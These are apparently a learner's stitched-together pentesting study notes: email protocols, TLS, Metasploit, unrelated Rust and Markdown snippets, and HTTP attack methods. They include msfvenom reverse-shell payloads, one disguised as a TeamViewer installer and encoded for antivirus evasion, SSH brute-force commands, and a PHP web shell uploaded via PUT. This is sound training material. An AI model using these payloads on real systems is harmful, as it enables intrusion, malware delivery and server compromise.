FTPS uses multiple ports and needs a secondary data channel which makes using firewalls more difficult. On the other hand, SFTP uses a single connection between the client and the server and so it is more firewall-friendly

#STMP
Email delivery over the Internet requires the following components:

    Mail Submission Agent (MSA)
    Mail Transfer Agent (MTA)
    Mail Delivery Agent (MDA)
    Mail User Agent (MUA)


These are the following five steps that an email needs to go through to reach the recipient’s inbox:

    A Mail User Agent (MUA), or simply an email client, has an email message to be sent. The MUA connects to a Mail Submission Agent (MSA) to send its message.
    The MSA receives the message, checks for any errors before transferring it to the Mail Transfer Agent (MTA) server, commonly hosted on the same server.
    The MTA will send the email message to the MTA of the recipient. The MTA can also function as a Mail Submission Agent (MSA).
    A typical setup would have the MTA server also functioning as a Mail Delivery Agent (MDA).
    The recipient will collect its email from the MDA using their email client.

If the above steps sound confusing, consider the following analogy:

    You (MUA) want to send postal mail.
    The post office employee (MSA) checks the postal mail for any issues before your local post office (MTA) accepts it.
    The local post office checks the mail destination and sends it to the post office (MTA) in the correct country.
    The post office (MTA) delivers the mail to the recipient mailbox (MDA).
    The recipient (MUA) regularly checks the mailbox for new mail. They notice the new mail, and they take it.

In the same way, we need to follow a protocol to communicate with an HTTP server, and we need to rely on email protocols to talk with an MTA and an MDA. The protocols are:

    Simple Mail Transfer Protocol (SMTP)
    Post Office Protocol version 3 (POP3) or Internet Message Access Protocol (IMAP)

We explain SMTP in this task and elaborate on POP3 and IMAP in the following two tasks.

Simple Mail Transfer Protocol (SMTP) is used to communicate with an MTA server. Because SMTP uses cleartext, where all commands are sent without encryption, we can use a basic Telnet client to connect to an SMTP server and act as an email client (MUA) sending a message.

SMTP server listens on port 25 by default. To see basic communication with an SMTP server, we used Telnet to connect to it. Once connected, we issue helo hostname and then start typing our email.

After helo, we issue mail from:, rcpt to: to indicate the sender and the recipient. When we send our email message, we issue the command data and type our message. We issue <CR><LF>.<CR><LF> (or Enter . Enter to put it in simpler terms). The SMTP server now queues the message.

-=-=-=-=
POP3 

Post Office Protocol version 3 (POP3) is a protocol used to download the email messages from a Mail Delivery Agent (MDA) server, as shown in the figure below. The mail client connects to the POP3 server, authenticates, downloads the new email messages before (optionally) deleting them.

First, the user connects to the POP3 server at the POP3 default port 110. Authentication is required to access the email messages; the user authenticates by providing his username USER frank and password PASS D2xc9CgD. Using the command STAT, we get the reply +OK 1 179; based on RFC 1939, a positive response to STAT has the format +OK nn mm, where nn is the number of email messages in the inbox, and mm is the size of the inbox in octets (byte). The command LIST provided a list of new messages on the server, and RETR 1 retrieved the first message in the list. We don’t need to concern ourselves with memorizing these commands; however, it is helpful to strengthen our understanding of such protocol.


In general, your mail client (MUA) will connect to the POP3 server (MDA), authenticate, and download the messages. Although the communication using the POP3 protocol will be hidden behind a sleek interface, similar commands will be issued, as shown in the Telnet session above.

Based on the default settings, the mail client deletes the mail message after it downloads it. The default behaviour can be changed from the mail client settings if you wish to download the emails again from another mail client. Accessing the same mail account via multiple clients using POP3 is usually not very convenient as one would lose track of read and unread messages. To keep all mailboxes synchronized, we need to consider other protocols, such as IMAP.


-=-=-==
IMAP 
Internet Message Access Protocol (IMAP) is more sophisticated than POP3. IMAP makes it possible to keep your email synchronized across multiple devices (and mail clients). In other words, if you mark an email message as read when checking your email on your smartphone, the change will be saved on the IMAP server (MDA) and replicated on your laptop when you synchronize your inbox.

Let’s take a look at sample IMAP commands. In the console output below, we use Telnet to connect to the IMAP server’s default port, and then we authenticate using LOGIN username password. IMAP requires each command to be preceded by a random string to be able to track the reply. So we added c1, then c2, and so on. Then we listed our mail folders using LIST "" "*", before checking if we have any new messages in the inbox using EXAMINE INBOX. We don’t need to memorize these commands; however, we are simply providing the example below to give a vivid image of what happens when the mail client communicates with an IMAP server.


-=-=-==-=-=-=-=-=-=-=-=-=-=-=

Servers implementing these protocols are subject to different kinds of attacks. To name a few, consider:

    Sniffing Attack (Network Packet Capture)
    Man-in-the-Middle (MITM) Attack
    Password Attack (Authentication Attack)
    Vulnerabilities

Attacking protocols and servers
From a security perspective, we always need to think about what we aim to protect; consider the security triad: Confidentiality, Integrity, and Availability (CIA). Confidentiality refers to keeping the contents of the communications accessible to the intended parties. Integrity is the idea of assuring any data sent is accurate, consistent, and complete when reaching its destination. Finally, availability refers to being able to access the service when we need it. Different parties will put varying emphasis on these three. For instance, confidentiality would be the highest priority for an intelligence agency. Online banking will put most emphasis on the integrity of transactions. Availability is of the highest importance for any platform making money by serving ads.

Knowing that we are protecting the Confidentiality, Integrity, and Availability (CIA), an attack aims to cause Disclosure, Alternation, and Destruction (DAD)

-=-=-=
Sniffing attack
We would consider the following
    Tcpdump is a free open source command-line interface (CLI) program that has been ported to work on many operating systems.
    Wireshark is a free open source graphical user interface (GUI) program available for several operating systems, including Linux, macOS and MS Windows.
    Tshark is a CLI alternative to Wireshark.

Consider a user checking his email messages using POP3. First, we are going to use Tcpdump to attempt to capture the username and password. In the terminal output below, we used the command sudo tcpdump port 110 -A. Before explaining this command, we should mention that this attack requires access to the network traffic, for example, via a wiretap or a switch with port mirroring. Alternatively, we can access the traffic exchanged if we launch a successful Man-in-the-Middle (MITM) attack.

We need sudo as packet captures require root privileges. We wanted to limit the number of captured and displayed packets to those exchanged with the POP3 server. We know that POP3 uses port 110, so we filtered our packets using port 110. Finally, we wanted to display the contents of the captured packets in ASCII format, so we added -A


-=-=-==-
SSL/TLS

The protocols we have covered so far in this room are on the application layer. Consider the ISO/OSI model; we can add encryption to our protocols via the presentation layer. Consequently, data will be presented in an encrypted format (ciphertext) instead of its original form.

Protocol 	Default Port 	Secured Protocol 	Default Port with TLS
HTTP 	        80 	        HTTPS 	                443
FTP     	21      	FTPS            	990
SMTP     	25      	SMTPS            	465
POP3     	110      	POP3S            	995
IMAP     	143      	IMAPS            	993

Considering the case of HTTP. Initially, to retrieve a web page over HTTP, the web browser would need at least perform the following two steps:

    Establish a TCP connection with the remote web server
    Send HTTP requests to the web server, such as GET and POST requests.

HTTPS requires an additional step to encrypt the traffic. The new step takes place after establishing a TCP connection and before sending HTTP requests. This extra step can be inferred from the ISO/OSI model in the image presented earlier. Consequently, HTTPS requires at least the following three steps:

    Establish a TCP connection
    Establish SSL/TLS connection
    Send HTTP requests to the webserver

To establish an SSL/TLS connection, the client needs to perform the proper handshake with the server.


After establishing a TCP connection with the server, the client establishes an SSL/TLS connection, as shown in the figure above. The terms might look complicated depending on your knowledge of cryptography, but we can simplify the four steps as:

    The client sends a ClientHello to the server to indicate its capabilities, such as supported algorithms.
    The server responds with a ServerHello, indicating the selected connection parameters. The server provides its certificate if server authentication is required. The certificate is a digital file to identify itself; it is usually digitally signed by a third party. Moreover, it might send additional information necessary to generate the master key, in its ServerKeyExchange message, before sending the ServerHelloDone message to indicate that it is done with the negotiation.
    The client responds with a ClientKeyExchange, which contains additional information required to generate the master key. Furthermore, it switches to use encryption and informs the server using the ChangeCipherSpec message.
    The server switches to use encryption as well and informs the client in the ChangeCipherSpec message.

If this still sounds sophisticated, don’t worry; we only need the gist of it. A client was able to agree on a secret key with a server that has a public certificate. This secret key was securely generated so that a third party monitoring the channel wouldn’t be able to discover it. Further communication between the client and the server will be encrypted using the generated key.

Consequently, once an SSL/TLS handshake has been established, HTTP requests and exchanged data won’t be accessible to anyone watching the communication channel.

As a final note, for SSL/TLS to be effective, especially when browsing the web over HTTPS, we rely on public certificates signed by certificate authorities trusted by our systems. In other words, when we browse to TryHackMe over HTTPS, our browser expects the TryHackMe web server to provide a signed certificate from a trusted certificate authority, as per the example below. This way, our browser ensures that it is communicating with the correct server, and a MITM attack cannot occur.

we can see the following information:

    To whom is the certificate issued? That is the name of the company that will use this certificate.
    Who issued the certificate? This is the certificate authority that issued this certificate.
    Validity period. You don’t want to use a certificate that has expired, for instance.

Luckily, we don’t have to check the certificate manually for every site we visit; our web browser will do it for us. Our web browser will ensure that we are talking with the correct server and ensure that our communication is secure, thanks to the server’s certificate.

SSH
To use SSH, you need an SSH server and an SSH client. The SSH server listens on port 22 by default. The SSH client can authenticate using:

    A username and a password
    A private and public key (after the SSH server is configured to recognize the corresponding public key)

Vulnerability	Description
Operating System
	These types of vulnerabilities are found within Operating Systems (OSs) and often result in privilege escalation.
(Mis)Configuration-based
	These types of vulnerability stem from an incorrectly configured application or service. For example, a website exposing customer details.
Weak or Default Credentials
	Applications and services that have an element of authentication will come with default credentials when installed. For example, an administrator dashboard may have the username and password of "admin". These are easy to guess by an attacker. 
Application Logic
	These vulnerabilities are a result of poorly designed applications. For example, poorly implemented authentication mechanisms that may result in an attacker being able to impersonate a user.
Human-Factor
	Human-Factor vulnerabilities are vulnerabilities that leverage human behaviour. For example, phishing emails are designed to trick humans into believing they are legitimate.

'The Metasploit Framework'
  5.1 Overview
    MSF Architecture
      Interfaces: MSFconsole, MSFcli, Armitage & Web
      Modules: 
        exploit, 
        payload:
          > It is an advanced multi-functional paylaod that is executed in memory on the target system making it difficult to detect. It is not downloaded to the target system or is not executed on disk. As a result, no traces of the payload are left or are found on the target system
	  Staged payloads create a way for us to send over more components of our attack. We can think of it like we are "setting the stage" for something even more useful. Take for example this payload linux/x86/shell/reverse_tcp. When run using an exploit module in Metasploit, this payload will send a small stage that will be executed on the target and then call back to the attack box to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. Of course, if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. What happens at each stage could vary depending on the payload. As a Metasploit user, we will meet these under the common names reverse_tcp, reverse_https, and bind_tcp.

	Stageless payloads do not have a stage.   Take for example this payload linux/zarch/meterpreter_reverse_tcp. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on stageless Meterpreter payloads => (https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)
          Stageless (or Non-Staged payload): Payload that is sent to the taget system as is along with the exploit
          Staged payload : It is sent to the target in two parts whereby:
            Stagers: Stagers are typically used to establish a stable communication channel between the attacker and target, after which a stage payload is downloaded and executed on the target system
            Stage: Payload components that are downloaded by the stager
		> Now that we understand the differences between a staged and stageless payload, we can identify them within Metasploit. The answer is simple. The name will give you your first marker. Take our examples from above, linux/x86/shell/reverse_tcp is a staged payload, and we can tell from the name since each / in its name represents a stage from the shell forward. So /shell/ is a stage to send, and /reverse_tcp is another. This will look like it is all pressed together for a stageless payload. Take our example linux/zarch/meterpreter_reverse_tcp. It is similar to the staged payload except that it specifies the architecture it affects, then it has the shell payload and network communications all within the same function /meterpreter_reverse_tcp. For one last quick example of this naming convention, consider these two windows/meterpreter/reverse_tcp and windows/meterpreter_reverse_tcp. The former is a Staged payload. Notice the naming convention separating the stages. The latter is a Stageless payload since we see the shell payload and network communication in the same portion of the name. If the name of the payload doesn't appear quite clear to you, it will often detail if the payload is staged or stageless in the description.

        > Using Plugins

            + To start using a plugin, we will need to ensure it is installed in the correct directory on our machine. Navigating to /usr/share/metasploit-framework/plugins, which is the default directory for every new installation of msfconsole, should show us which plugins we have to our availability:
                m1l0js@htb[/htb]$ ls /usr/share/metasploit-framework/plugins
            + If the plugin is found here, we can fire it up inside msfconsole and will be met with the greeting output for that specific plugin, signaling that it was successfully loaded in and is now ready to use:
                msf6 > load nessus

        > Installing new plugins
            + For example, let us try installing DarkOperator's Metasploit-Plugins(https://github.com/darkoperator/Metasploit-Plugins.git). Then, following the link above, we get a couple of Ruby (.rb) files which we can directly place in the folder mentioned above.
                m1l0js@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins
                m1l0js@htb[/htb]$ ls Metasploit-Plugins
            + Here we can take the plugin pentest.rb as an example and copy it to /usr/share/metasploit-framework/plugins.
                MSF - Copying Plugin to MSF
                    m1l0js@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
            + Afterward, launch msfconsole and check the plugin's installation by running the load command. After the plugin has been loaded, the help menu at the msfconsole is automatically extended by additional functions.
                MSF - Load Plugin
                    m1l0js@htb[/htb]$ msfconsole -q
                    msf6 > load pentest
            + Many people write many different plugins for the Metasploit framework. They all have a specific purpose and can be an excellent help to save time after familiarizing ourselves with them. Check out the list of popular plugins below:

[+] Mixins
    + The Metasploit Framework is written in Ruby, an object-oriented programming language. This plays a big part in what makes msfconsole excellent to use. Mixins are one of those features that, when implemented, offer a large amount of flexibility to both the creator of the script and the user.
    + Mixins are classes that act as methods for use by other classes without having to be the parent class of those other classes. Thus, it would be deemed inappropriate to call it inheritance but rather inclusion. They are mainly used when we:
    +     Want to provide a lot of optional features for a class.
    +     Want to use one particular feature for a multitude of classes.
    + Most of the Ruby programming language revolves around Mixins as Modules. The concept of Mixins is implemented using the word include, to which we pass the name of the module as a parameter. We can read more about mixins here => (https://en.wikibooks.org/wiki/Metasploit/UsingMixins)
    + If we are just starting with Metasploit, we should not worry about the use of Mixins or their impact on our assessment. However, they are mentioned here as a note of how complex the customization of Metasploit can become.

    Generating payloads with Msfvenom
      Msfvenom is a combination of two utilities, namely; msfpayload and msfencode
      msfvenom --list payloads
      msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > payloadx86.exe
      msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > payloadx64.exe
      msfvenom --list formats //List valid executable formats 
      msfvenom  -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f elf > payloadx86
      msfvenom  -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f elf > payloadx64
        elf //Linux binary

        How to transfer this files?
          sudo python -m SimpleHttpServer 80
        
        We await from a connection back //Example
          msfconsole -q 
           set payload linux/x86/meterpreter/reverse_tcp
           use exploit/multi/handler 
	> Another example of create a stageless payload
		msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
    Encoding payloads with Msfvenom
        > They are also needed to remove hexadecimal opcodes known as bad characters from the payload. Not only that but encoding the payload in different formats could help with the AV detection as mentioned above. However, the use of encoders strictly for AV evasion has diminished over time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.

        > Shikata Ga Nai (SGN) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore. Far from it. The name (仕方がない) means It cannot be helped or Nothing can be done about it, and rightfully so if we were reading this a few years ago. However, there are other methodologies we will explore to evade protection systems. This article from FireEye(https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html) details the why and the how of Shikata Ga Nai's previous rule over the other encoders.
      We can evade older signature based AV solutions by encoding our payloads.

        [+] Selecting an Encoder

            > Before 2015, the Metasploit Framework had different submodules that took care of payloads and encoders. They were packed separately from the msfconsole script and were called msfpayload and msfencode. These two tools are located in /usr/share/framework2/.
            > If we wanted to create our custom payload, we could do so through msfpayload, but we would have to encode it according to the target OS architecture using msfencode afterward. A pipe would take the output from one command and feed it into the next, which would generate an encoded payload, ready to be sent and run on the target machine.
                m1l0js@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
            > After 2015, updates to these scripts have combined them within the msfvenom tool, which takes care of payload generation and Encoding. We will be talking about msfvenom in detail later on. Below is an example of what payload generation would look like with today's msfvenom and without encoding
                #Generating Payload - Without Encoding
                m1l0js@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
            > We should now look at the first line of the $buf and see how it changes when applying an encoder like shikata_ga_nai. 
                #Generating Payload - With Encoding
                m1l0js@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
            > If we want to look at the functioning of the shikata_ga_nai encoder, we can look at an excellent post here.(https://hatching.io/blog/metasploit-payloads2/)
            > Suppose we want to select an Encoder for an existing payload. Then, we can use the show encoders command within the msfconsole to see which encoders are available for our current Exploit module + Payload combination.
            
            > For example, let us try the MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit.
                + Take the above example just as that—a hypothetical example. If we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today. Let's delve into that for a moment. Picking up msfvenom, the subscript of the Framework that deals with payload generation and Encoding schemes, we have the following input:
                    m1l0js@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
                + This will generate a payload with the exe format, called TeamViewerInstall.exe, which is meant to work on x86 architecture processors for the Windows platform, with a hidden Meterpreter reverse_tcp shell payload, encoded once with the Shikata Ga Nai scheme. Let us take the result and upload it to VirusTotal.

                + One better option would be to try running it through multiple iterations of the same Encoding scheme:
                    m1l0js@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
                + As we can see, it is still not enough for AV evasion. There is a high number of products that still detect the payload. Alternatively, Metasploit offers a tool called msf-virustotal that we can use with an API key to analyze our payloads. However, this requires free registration on VirusTotal.
                    m1l0js@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe


      msfvenom --list encoders

        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > encodedx86.exe

Photo EXIF Data

EXIF stands for Exchangeable Image File Format; it is a standard for saving metadata to image files. Whenever you take a photo with your smartphone or with your digital camera, plenty of information gets embedded in the image. The following are examples of metadata that can be found in the original digital images:

    Camera model / Smartphone model
    Date and time of image capture
    Photo settings such as focal length, aperture, shutter speed, and ISO settings

Because smartphones are equipped with a GPS sensor, finding GPS coordinates embedded in the image is highly probable. The GPS coordinates, i.e., latitude and longitude, would generally show the place where the photo was taken.

  What is difference between git log and Reflog?
  The biggest difference between Git reflog vs. log is that the log is a public accounting of the repository's commit history while the reflog is a private, workspace-specific accounting of the repo's local commits

Markdown
[+]Images ==> The first image style is called an inline image link. To create an inline image link, enter an exclamation point ( ! ), wrap the alt text in brackets ( [ ] ), and then wrap the link in parenthesis ( ( ) ). (Alt text is a phrase or sentence that describes the image for the visually impaired.)

For example, to create an inline image link to https://octodex.github.com/images/bannekat.png, with an alt text that says, Benjamin Bannekat, you'd write this in Markdown: ![Benjamin Bannekat](https://octodex.github.com/images/bannekat.png)

For a reference image, you'll follow the same pattern as a reference link. You'll precede the Markdown with an exclamation point, then provide two brackets for the alt text, and then two more for the image tag, like this: ![The founding father][Father] At the bottom of your Markdown page, you'll define an image for the tag, like this: [Father]: http://octodex.github.com/images/founding-father.jpg.

[+] Blockquotes
To create a block quote, all you have to do is preface a line with the "greater than" caret (>).
Notice that even blank lines must contain the caret character. This ensures that the entire blockquote is grouped together.

[+] Lists ==> To create an unordered list, you'll want to preface each item in the list with an asterisk ( * ) ==> An ordered list is prefaced with numbers, instead of asterisks

[+] Paragraphs ==> 2 spaces or a new line

println("x = {} and y {}", x, y);

3.1. Variables and mutability
const THREE_HOURS_IN_SECONDS: u32 = 60 * 60 * 3;
shadowing

3.2. Data types
Length	  Signed	    Unsigned
8-bit	    i8  	      u8
16-bit	  i16	        u16
32-bit	  i32,f32	    u32
64-bit	  i64,f64	    u64
128-bit	  i128	      u128
arch	    isize	      usize
4 bytes ==> ' '

Booleans are one byte in size. // let f: bool = false; 
we specify char literals with single quotes, as opposed to string literals, which use double quotes.


To explicitly handle the possibility of overflow, you can use these families of methods provided by the standard library for primitive numeric types:

    Wrap in all modes with the wrapping_* methods, such as wrapping_add
    Return the None value if there is overflow with the checked_* methods
    Return the value and a boolean indicating whether there was overflow with the overflowing_* methods
    Saturate at the value’s minimum or maximum values with saturating_* methods

Tuples
We create a tuple by writing a comma-separated list of values inside parentheses. Each position in the tuple has a type, and the types of the different values in the tuple don’t have to be the same.
fn main() {
  let tup: (i32, f64, u8) = (500, 6.4, 1);
  let (x, y, z) = tup; // Access a individual value in this single compound element
  println!("The value of y is: {}",y);
  //Accesing by the index of the value
  let x: (i32, f64, u8) = (500, 6.4, 1);
  let five_hundred = x.0;
}

Array
Unlike a tuple, every element of an array must have the same type. Unlike arrays in some other languages, arrays in Rust have a fixed length.
fn main() {
  let a: [i32; 5] = [1, 2, 3, 4, 5];
  //Accessing array elements
  let first = a[0]; //1
  //You could write
  let a = [3; 5]; //which is equal to ==> let a = [3, 3, 3, 3, 3];
}

//Example of invalid array element access 

This is an example of Rust’s memory safety principles in action. In many low-level languages, this kind of check is not done, and when you provide an incorrect index, invalid memory can be accessed. Rust protects you against this kind of error by immediately exiting instead of allowing the memory access and continuing.


-=-=
3.3. Functions
Rust doesn’t care where you define your functions, only that they’re defined somewhere in a scope that can be seen by the caller.

Statements vs expressions?
  Statements are instructions that perform some action and do not return a value. 
    Ex: let y = 6; //It is a statement
  Expressions evaluate to a resulting value.
    Do not include ending semicolons. If you add a semicolon to the end of an expression, you turn it into a statement, and it will then not return a value
    Ex: 5 + 6

3.4. Control flow

fn main() {
    let number = 6;

    if number % 4 == 0 {
        println!("number is divisible by 4");
    } else if number % 3 == 0 {
        println!("number is divisible by 3");
    } else if number % 2 == 0 {
        println!("number is divisible by 2");
    } else {
        println!("number is not divisible by 4, 3, or 2");
    }
}


Using if in a let statement

    println!("The value of number is: {number}");
}

//Rust has three kinds of loops: loop, while and for.
loop
  break
  continue: In a loop tells the program to skip over any remaining code in this iteration of the loop and go to the next iteration.
fn main() {
    let mut counter = 0;

    let result = loop {
        counter += 1;
        if counter == 10 {
            break counter * 2;
        }
    };
    println!("The result is {}",result);
}

Loop Labels to Disambiguate Between Multiple Loops
  Loop labels must begin with a single quote. 

  fn main() {
    let mut count = 0;
    'counting_up: loop {
        println!("count = {}",count);
        let mut remaining = 10;
        

        loop {
            println!("remaining = {}",remaining);
            if remaining == 9 {
                break;
            }
            if count == 2{
                break 'counting_up;
            }
            remaining -= 1;
        }
        count += 1;
    }
    println!("End count = {}", count);
}

Looping through a collection with for
  fn main() {
    for number in (1..4).rev() {
        println!("{number}!");
    }
    println!("LIFTOFF!!!");
}

* Tools ==> Brute force
	> onesixtyone : Can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool
		https://github.com/trailofbits/onesixtyone
		onesixtyone -c dict.txt 10.129.42.254
####SSH
* SSH can also be used to access Windows host and is now native to Windows 10 since version 1809. 
* SSH authentication can be configured in two ways:
	> Username & password authentication
      	> Key based authentication
    	> Examples:
		use auxiliary/scanner/ssh/ssh_version
		ssh 192.168.188.128 22
    		version? 
    		  	nc 192.168.188.128
    		algorithms that can be used to create the key?
    		  	nmap 192.168.188.128 -p22 --script ssh-enum-algos
    		  	ssh -vv 192.168.188.128
    		get ssh server key fingerprint
    		  	nmap 192.168.188.128 -p22 --script ssh-hostkey --script-args ssh_hostkey=full
    		  	ssh-keyscan host | ssh-keygen -lf -
		[+] Auth methods
    			nmap 192.168.188.128 -p22 --script ssh-auth-methods --script-args "ssh.user=admin"
    		[+] Dictionary attack
    		  	nmap 192.168.188.128 -p22 --script ssh-brute --scritp-args userdb=/root/user 
		[+] Metasploit
    		  	auxiliary/scanner/ssh/ssh_login
    		    		set userpass_file /usr/share/wordlist/metasploit/root_userpass.txt
		[+] Other example: We see the reported version is OpenSSH 8.2p1 Ubuntu 4ubuntu0.1. 
			From inspection of other Ubuntu SSH package changelogs(https://launchpad.net/ubuntu/yakkety/+source/openssh/+changelog), we see the release version takes the format 1:7.3p1-1ubuntu0.1. 
			Updating our version to fit this format, we get 1:8.2p1-4ubuntu0.1. 
			In Google ==> '1:8.2p1-4ubuntu0.1 release' ==>  A quick search for this version online reveals that it is included in Ubuntu Linux Focal Fossa 20.04
			In Google ==> 'Ubuntu Linux Focal Fossa 20.04 release date'


####HTTP
* GET /index.html HTTP/1.1 to retrieve the page index.html or GET / HTTP/1.1 to retrieve the default page.
* HTTP is a stateles protocol. Every request is completely unrelated to the ones preceding and following it.
* The cookie jar is the storage space where a web browser stores the cookies. When a web server installs a cookie, it sets the domain field. Then, the browser will use the cookie for every request sent to that domain and all its subdomains. If the server does not specify the domain attribute, the browser will automatically set the domain as the server domain and set the cookie host-only flag; this means that the cookie will be sent only to that precise hostname
* -ign_eof
* Websites running PHP install session cookies by using the ==> PHPSESSID, JSP websites use ==> JSESSIONID
* Each development language has its own default session parameter name. Of course, the web developer can also choose to use a custom parameter name
* Session IDs can also be transmitted via GET requests ==> http://example.site/resource.php?sessid=s423ndsd
* Parameter http-only is very important for no access by javascript(document.cookie),java,etc.
* Expires ==> session [expires after close the browser ]
####Fingerprinting with Netcat
* It does not work with encryption
	nc -v www.ferrari.com 80 | GET / HTTP/1.1 Host:www.ferrari.com //Remember that every HTTP request has two empty lines between the header and the body of the reques itself
  	nc -lvnp 8888 (Server) ==> echo 'hello' | nc -v localhost 8888
  	nv example.com 80
  	  HEAD / HTTP/1.0 and hit enter 2 times.
  	  -u : UDP connection
  	  -v : To notify you after the connection to the server
  	  -k : Keep listening after client disconnects
  	  -z: zero I/O

####Fingerprinting with OpenSSL
	openssl s_client -connect hack.me:443 -debug | -state | -quiet and after that OPTIONS HTTP/1.1 Host: hack.me
	openssl x509 -in twitter.com-cert -noout -text
	openssl s_client -connect target.site:443
	HEAD / HTTP/1.0

####Fingerprinting with Httprint
* It uses a signature-based technique to indentify web servers
	httprint -P0 -h <target hosts> -s <signature file>
	-P0 to avoid pinging the host (most web servers do not respond to ping echo requests)

####HTTP methods (Some of them)
* If you use HTTP/1.0, you can skip the Host: header
* OPTIONS (Used to query the web server for enabled HTTP Verbs)
	OPTIONS / HTTP/1.1
    	Host: www.example.site

	curl -X OPTIONS 192.45.178.3 -v

* GET (To request a resource)
	GET /page.php HTTP/1.1 //You can also passa arguments like ==> ... /page.php?course=PTS...
    	Host: www.example.site

    	curl -X GET 192.45.178.3

* POST (To submit HTML form data. POST parameters must be in the message body)
	POST /login.php HTTP/1.1
    	Host: www.example.site

    	username=john&password=mypass

    	curl -X POST 192.45.178.3
    	curl -X POST 192.45.178.3/login.php -d "name=m1l0js&password=m1l0js" -v

* HEAD (Very similar to GET, as it asks just headers of the response instead of the response body)
	HEAD / HTTP/1.1
    	Host: www.example.site

    	curl -I 192.45.178.3
	curl -IL https://www.inlanefreight.com


* PUT (Used to upload a file to the server. It is very dangerous feature if it is allowed and misconfigured)
	PUT /path/to/destination HTTP/1.1
    	Host: www.example.site

    	<PUT data>

    	//You have to know the size of the file you want to upload on the server ==> wc -m payload.php = 20

    	nc victim.site 80
    	PUT /payload.php HTTP/1.0
    	Content-type: text/html
    	Content-length: 20

    	<?php phpinfo(); ?>
    	
    	//Uploading a PHP shell with PUT
    	  nc victim.site 80
    	  PUT /shell.php HTTP/1.0
    	  Content-type: text/html
    	  Content-length: 136 //wc -m shell.php. The code below

    	  <?php
    	  if (isset($_GET['cmd'])) //Runs the following code only if the GET cmd parameter is set
    	  {
    	    $cmd = $_GET['cmd']; //Reads the command to execute
    	    echo '<pre>';
    	    $result = shell_exec($cmd); //Runs the command by using the OS shell
    	    echo $result; //Displays the output of the command
    	    echo '</pre>';
    	  }

    	  [+] In the web browser: victim site/shell.php?cmd=ls


    	curl -X PUT 192.45.178.3
      
* DELETE (Used to remove a file from the server. If misconfigured leads to denial of service and data loss)
	DELETE /path/to/destination HTTP/1.1
    	Host: www.example.site

    	curl -XDELETE 192.45.178.3/uploads/hello.txt


####REST APIs (Representational State Transfer Application Programming Interface)
* Are a specific type of web application that relies strongly on almost all HTTP Verbs. They are often reffered to as 'web services' or simply APIs
* It is sometimes easy to confuse REST APIs PUT method, which simply creates new content with a PUT method that allows us to create an arbitrary file.

##Vulnerability Assessment
###Linux Vulnerabilities

* Shellshock
	(){:;};.
    	> In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack
    	  CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client.
	[+] Ways 
    		> Manually
    			nmap -sV  192.168.188.126 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"

    	      			set targeturi /gettime.cgi
###Frequently exploited Windows services
Microsoft IIS(Internet Information Services)    80/443    Propietary web server software developed by Microsoft that runs on Windows
WebDAV(Web Distributed Authoring & Versioning)  80/443    HTTP extension that allows clients to update, delete, move and copy files on a web server. WebDAV is used to enable a web server to act as a file server for colllaborative authoring
SMB/CIFS(Server Message Block Protocol)         445       Network file sharing protocol that is used to facilitate the sharing of files and peripherals(printers and serial ports) between computers on LAN
RDP(Remote Desktop Protocol)                    3389      Propietary GUI remote access protocol developed by Microsoft and is used to remotely authenticate and interact with a Windows system
WinRM(Windows Remote Management Protocol)       5986/443  Windows remote management protocol that can be used to facilitate remote access with Windows systems
###PsExec
* It is a lightweight telnet-replacement developed by Microsoft that allows you execute processes on remote windows systems using any user's credentials.
* PsExec authentication is performed via SMB. 
* We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt.
* Similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.
  	nmap -sCV 192.168.188.126
	msfconsole
